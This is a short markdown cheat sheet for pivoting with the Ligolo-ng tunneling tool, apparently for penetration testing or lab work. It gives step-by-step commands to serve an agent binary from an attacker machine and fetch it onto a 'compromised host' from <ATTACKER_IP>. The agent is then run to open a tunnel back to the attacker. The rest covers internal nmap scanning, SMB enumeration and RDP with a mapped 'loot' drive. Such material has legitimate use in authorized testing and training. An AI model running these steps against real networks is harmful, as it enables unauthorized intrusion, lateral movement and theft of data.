# Ligolo-ng — Pivoting Cheat Sheet

Ligolo-ng is a lightweight, modern tunneling tool (like chisel) for pivoting through compromised hosts into internal networks.

---

## Setup

### Download Binaries
On **attacker**:
```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
```

---

## Usage

### Start Proxy (Attacker)
```bash
./proxy -selfcert
```
- Creates listener on `0.0.0.0:11601`  
- Generates a self-signed cert automatically

### Deploy Agent (Target)
On **attacker** (serve binary):
```bash
python3 -m http.server 8000
```

On **target (compromised host)**:
```bash
wget http://<ATTACKER_IP>:8000/agent
chmod +x agent
./agent -connect <ATTACKER_IP>:11601 --ignore-cert
```

---

## Proxy Console Commands
Inside proxy interactive shell:
```text
session        # list active sessions
session 0      # select target session (e.g., DMZ01)
autoroute      # add route for target subnet (auto-creates tun iface)
ifconfig       # verify tun interface (ligolo0)
start          # activate tunnel
```

Now traffic can be routed through `ligolo0` as if local.

---

## Examples

### Internal Scanning
```bash
nmap -sT -Pn -p445 172.16.119.7
```

### SMB Enumeration via Tunnel
```bash
nxc smb 172.16.119.10 -u user -p 'Password123!'
```

### RDP via Tunnel
```bash
xfreerdp /v:172.16.119.7 /u:user /p:'Password123!' /dynamic-resolution /drive:loot,.
```

---

## Cleanup

On **target**:
```bash
killall agent && rm agent
```

On **attacker** (proxy shell):
```bash
exit
```

---

## Notes
- Use Ligolo-ng when you need **pivot access** after a DMZ foothold.  
- All tools (`nmap`, `netexec`, `smbclient`, `xfreerdp`) will use the tunnel transparently.  
- Preferred over `chisel` — cleaner, more stable, supports multiple sessions and autoroute.

---

## References
- Ligolo-ng: https://github.com/nicocha30/ligolo-ng
